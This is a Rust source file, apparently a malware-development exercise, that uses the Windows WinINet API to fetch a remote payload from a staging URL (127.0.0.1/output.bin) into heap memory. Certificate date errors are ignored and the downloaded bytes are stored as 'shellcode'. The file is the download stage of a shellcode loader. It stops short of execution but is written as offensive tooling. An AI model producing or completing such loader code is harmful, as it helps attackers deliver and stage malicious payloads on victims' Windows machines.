extern crate winapi;

use std::ffi::{c_void, OsStr};
use std::os::windows::ffi::OsStrExt;
use winapi::um::wininet::{InternetOpenW, InternetOpenUrlW, InternetReadFile, InternetCloseHandle, InternetSetOptionW, INTERNET_FLAG_HYPERLINK, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, HINTERNET, INTERNET_OPTION_SETTINGS_CHANGED};
use std::ptr::null;
use winapi::um::winbase::{LocalAlloc, LocalReAlloc};
use winapi::um::minwinbase::{LMEM_MOVEABLE, LMEM_ZEROINIT, LPTR};
use winapi::shared::minwindef::{LPVOID, PBYTE};
use winapi::shared::basetsd::SIZE_T;

type LPCWSTR = *const u16;

fn to_wide(string: &str) -> Vec<u16> {
    OsStr::new(string).encode_wide().chain(std::iter::once(0)).collect()
}

fn main() {
    let h_internet = unsafe { InternetOpenW(null(), 0, null(), null(), 0) };

    if h_internet.is_null() {
        println!("[!] InternetOpenW failed: {}", std::io::Error::last_os_error());
        panic!();
    }

    let h_internet_handle = unsafe { InternetOpenUrlW(h_internet,to_wide("http://127.0.0.1/output.bin").as_ptr(),null(),0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0) };

    if h_internet_handle.is_null() {
        println!("[!] InternetOpenUrlW failed: {}", std::io::Error::last_os_error());
        panic!();
    }

    let p_tmp_bytes = unsafe { LocalAlloc(LPTR, 1024) as PBYTE };
    let mut bytes_read = 0;
    let mut s_size = 0;
    let mut p_bytes : PBYTE = unsafe { std::mem::zeroed() };

    loop {
        if unsafe{InternetReadFile(h_internet_handle,p_tmp_bytes as LPVOID,1024, &mut bytes_read)} == 0 {
            println!("[!] InternetReadFile failed: {}", std::io::Error::last_os_error());
            panic!();
        };

        s_size += bytes_read;
        if p_bytes.is_null() {
            p_bytes = unsafe { LocalAlloc(LPTR, bytes_read as SIZE_T) as PBYTE };
        }
        else {
            p_bytes = unsafe { LocalReAlloc(p_bytes as *mut winapi::ctypes::c_void, s_size as SIZE_T, LMEM_MOVEABLE | LMEM_ZEROINIT) as PBYTE };
        }

        unsafe { std::ptr::copy_nonoverlapping(p_tmp_bytes, p_bytes.add((s_size - bytes_read) as usize), bytes_read as usize) };
        unsafe { std::ptr::write_bytes(p_tmp_bytes,0,bytes_read as usize)};

        if bytes_read < 1024 {
            break;
        }
    }

    let shellcode = unsafe { std::slice::from_raw_parts(p_bytes as *mut u8, s_size as usize) };

    unsafe { InternetCloseHandle(h_internet) };
    unsafe { InternetCloseHandle(h_internet_handle) };
    unsafe { InternetSetOptionW(std::mem::zeroed::<HINTERNET>(), INTERNET_OPTION_SETTINGS_CHANGED, std::mem::zeroed::<LPVOID>(), 0) };
}